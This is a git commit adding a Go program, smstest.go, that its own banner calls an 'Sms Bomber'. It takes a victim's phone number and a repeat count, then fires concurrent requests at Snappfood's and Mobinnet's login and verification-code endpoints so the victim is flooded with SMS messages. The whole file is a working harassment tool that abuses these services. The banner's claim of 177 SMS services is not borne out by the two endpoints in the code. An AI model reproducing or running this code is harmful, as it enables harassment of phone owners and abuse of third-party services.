5f042e8bb2602734b359a21ddb88deb831818850
monsmain <matinfarmani20@gmail.com>
2025-04-25 12:57:08 +0330

    Update smstest.go

--- smstest.go
+++ smstest.go
@@ -1,1 +1,136 @@
+package main
 
+import (
+	"bytes"
+	"encoding/json"
+	"fmt"
+	"net/http"
+	"os"
+	"os/exec"
+	"runtime"
+	"time"
+	"net/url"
+	"strings"
+)
+
+
+func clearScreen() {
+	cmd := exec.Command("clear")
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/c", "cls")
+	}
+	cmd.Stdout = os.Stdout
+	cmd.Run()
+}
+
+func sms(url string, payload map[string]interface{}, ch chan<- int) {
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		fmt.Println("\033[01;31m[-] Error while encoding JSON!\033[0m")
+		ch <- http.StatusInternalServerError
+		return
+	}
+
+	time.Sleep(3 * time.Second)
+
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData)) // تغییر به application/json
+	time.Sleep(3 * time.Second)
+
+	if err != nil {
+		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
+		ch <- http.StatusInternalServerError
+		return
+	}
+	defer resp.Body.Close()
+
+	ch <- resp.StatusCode
+}
+
+func main() {
+	clearScreen()
+
+	fmt.Print("\033[01;32m") // Top (green)
+	fmt.Print(`
+                                :-.                                   
+                         .:   =#-:-----:                              
+                           **%@#%@@@#*+==:                            
+                       :=*%@@@@@@@@@@@@@@%#*=:                        
+                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
+                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
+              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
+             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
+            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
+            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
+           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
+`)
+	fmt.Print("\033[01;37m") // Middle (white)
+	fmt.Print(`
+           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
+           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
+           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
+            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
+             *@@%#            -@@@@@@.            #@@@+             
+             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
+              :@@*           =%@@@@@@%-   faster   *@@:              
+              #@@%         .*@@@@#%@@@%+.         %@@+              
+              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
+`)
+	fmt.Print("\033[01;31m") // Bottom (red)
+	fmt.Print(`
+              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
+               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
+                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
+                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
+                      #@@@@@@@@@@@@@@@@@@@@@@+                      
+                       *@@@@@@@@@@@@@@@@@@@@+                       
+                        +@@%*@@%@@@%%@%*@@%=                         
+                         +%+ %%.+@%:-@* *%-                          
+                          .  %# .%#  %+                              
+                             :.  %+  :.                              
+                                 -:                                  
+`)
+	fmt.Print("\033[0m") // Reset color
+
+	var phone string
+	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
+	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
+	fmt.Scan(&phone)
+
+	var repeatCount int
+	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
+	fmt.Scan(&repeatCount)
+
+	ch := make(chan int)
+
+	for i := 0; i < repeatCount; i++ {
+		formData := url.Values{}
+		formData.Set("cellphone", phone)
+		requestBody := strings.NewReader(formData.Encode())
+		go func() {
+			resp, err := http.Post("https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=0d436e7f-7345-4ed5-a283-01a8956b5fd4&locale=fa", "application/x-www-form-urlencoded", requestBody)
+			if err != nil {
+				fmt.Println("\033[01;31m[-] Error while sending request to Snappfood!\033[0m")
+				ch <- http.StatusInternalServerError
+				return
+			}
+			defer resp.Body.Close()
+			ch <- resp.StatusCode
+		}()     //active✅
+		go sms("https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{
+			"cellNumber": phone,
+		}, ch)  // active ✅
+
+
+	}
+
+for i := 0; i < repeatCount; i++ {
+    statusCode := <-ch
+    if statusCode == 404 || statusCode == 400 {
+        fmt.Println("\033[01;31m[-] Error ! ")
+    } else {
+        fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
+      }
+   }
+}
